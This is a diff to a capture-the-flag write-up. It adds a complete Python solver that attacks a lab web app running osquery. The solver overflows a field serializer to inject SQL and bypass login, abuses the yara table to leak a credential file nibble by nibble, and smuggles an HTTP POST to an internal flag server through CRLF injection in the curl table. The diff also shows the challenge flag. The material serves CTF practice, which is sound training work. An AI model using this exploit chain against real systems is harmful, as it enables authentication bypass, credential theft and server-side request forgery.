@@ -186,12 +186,9 @@ serialized := serializeBuffer([]byte(filename), []byte("path"), []byte("file"))
 ```
 
 because the same `serializeBuffer()` bug is reused here, we can again desynchronize the fields and choose our own:
-
 - `parameter`
 - `table`
-
 The allowed osquery tables are:
-
 ```go
 var allowedTables = []string{
     "users",
@@ -202,12 +199,9 @@ var allowedTables = []string{
     "etc_hosts",
 }
 ```
-
 The interesting tables are:
-
 - `yara`
 - `curl`
-
 
 ## Step 5: Hidden YARA Constraints Save the Exploit
 
@@ -342,4 +336,121 @@ http://flagserver:5001/047d15db72b47a7e8b874b279789f9fb2c76703be748b3593f399c9b0
 
 ```text
 africc{wh4t_4_gr34t_marathon}
+```
+solver.py
+```python
+#!/usr/bin/env python3
+import hashlib
+import re
+import urllib.parse
+
+import requests
+
+
+BASE = "https://7a5080b0343e.labs.ctfroom.com"
+HEX = "0123456789abcdef"
+CHUNK = 8
+
+
+def make_overflow_value(value: bytes, parameter: bytes, table: bytes) -> bytes:
+    filler_len = 65532 - len(parameter) - len(table)
+    if filler_len < 0:
+        raise ValueError(f"parameter too large: {len(parameter)}")
+    return (
+        value
+        + len(parameter).to_bytes(2, "big")
+        + parameter
+        + len(table).to_bytes(2, "big")
+        + table
+        + (b"A" * filler_len)
+    )
+
+
+def form_body(field: str, raw: bytes) -> bytes:
+    return f"{field}=".encode() + urllib.parse.quote_from_bytes(raw).encode()
+
+
+def overflow_post(
+    session: requests.Session,
+    path: str,
+    field: str,
+    value: bytes,
+    parameter: bytes,
+    table: bytes,
+    timeout: int = 60,
+) -> requests.Response:
+    raw = make_overflow_value(value, parameter, table)
+    return session.post(
+        BASE + path,
+        data=form_body(field, raw),
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        allow_redirects=False,
+        timeout=timeout,
+    )
+
+
+def login(session: requests.Session) -> None:
+    resp = overflow_post(
+        session,
+        "/login",
+        "Handle",
+        b"x",
+        b"username LIKE '%' OR 1-- ",
+        b"users",
+        20,
+    )
+    if "session" not in session.cookies:
+        raise RuntimeError(f"login failed: {resp.status_code} {resp.text[:200]}")
+
+
+def leak_credential(session: requests.Session) -> str:
+    found = {}
+    for start in range(0, 64, CHUNK):
+        rule_lines = []
+        for i in range(start, min(start + CHUNK, 64)):
+            prefix = "." * i
+            for c in HEX:
+                rule_lines.append(
+                    f"rule p{i:02d}_{c} {{ strings: $a = /^{prefix}{c}/ condition: $a }}"
+                )
+        rule = "\n".join(rule_lines)
+        parameter = (
+            "path='/opt/vault/credentials.dat' and sigrule='" + rule + "' -- "
+        ).encode()
+        resp = overflow_post(session, "/filesMetadata", "q", b"x", parameter, b"yara")
+        for name in re.findall(r"p\d{2}_[0-9a-f]", resp.text):
+            found[int(name[1:3])] = name[4]
+    if len(found) != 64:
+        raise RuntimeError(f"incomplete credential leak: got {len(found)} nibbles")
+    return "".join(found[i] for i in range(64))
+
+
+def unlock_flag(session: requests.Session, credential: str) -> str:
+    claim = hashlib.sha256(credential.encode()).hexdigest()
+    ua_expr = (
+        "'ua' || char(13) || char(10) || 'Host: flagserver:5001' || "
+        "char(13) || char(10) || char(13) || char(10) || "
+        "'POST / HTTP/1.1' || char(13) || char(10) || 'Host: flagserver:5001' || "
+        f"char(13) || char(10) || 'Content-Length: {len(credential)}' || "
+        f"char(13) || char(10) || char(13) || char(10) || '{credential}'"
+    )
+    parameter = f"url='http://flagserver:5001/' and user_agent={ua_expr} -- ".encode()
+    overflow_post(session, "/filesMetadata", "q", b"x", parameter, b"curl", 20)
+
+    parameter = f"url='http://flagserver:5001/{claim}' -- ".encode()
+    resp = overflow_post(session, "/filesMetadata", "q", b"x", parameter, b"curl", 20)
+    return resp.text.strip()
+
+
+def main() -> None:
+    session = requests.Session()
+    login(session)
+    credential = leak_credential(session)
+    print(f"[+] credential: {credential}")
+    flag = unlock_flag(session, credential)
+    print(f"[+] flag: {flag}")
+
+
+if __name__ == "__main__":
+    main()
 ```
